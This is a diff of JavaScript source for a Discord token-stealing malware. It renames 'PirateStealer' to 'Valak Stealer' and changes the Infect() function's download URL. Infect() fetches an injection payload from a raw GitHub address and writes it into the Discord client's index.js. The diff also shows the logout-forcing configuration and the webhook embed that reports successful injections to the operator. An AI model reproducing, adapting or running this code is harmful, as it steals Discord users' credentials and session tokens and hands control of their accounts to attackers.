@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection-clean', (resp) => {
+    https.get('https://raw.githubusercontent.com/youngvalak/dznstealer/main/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -61,7 +61,7 @@ function Infect() {
                     }
                 }
                 if ( config.logout !== "false" ) {
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    let folder = file.replace("index.js", "Valak Stealer")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -166,14 +166,14 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
+            "title": ":detective: Injetado com Sucesso",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "Valak Stealer"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "Valak Stealer"
             }
           }
         ]
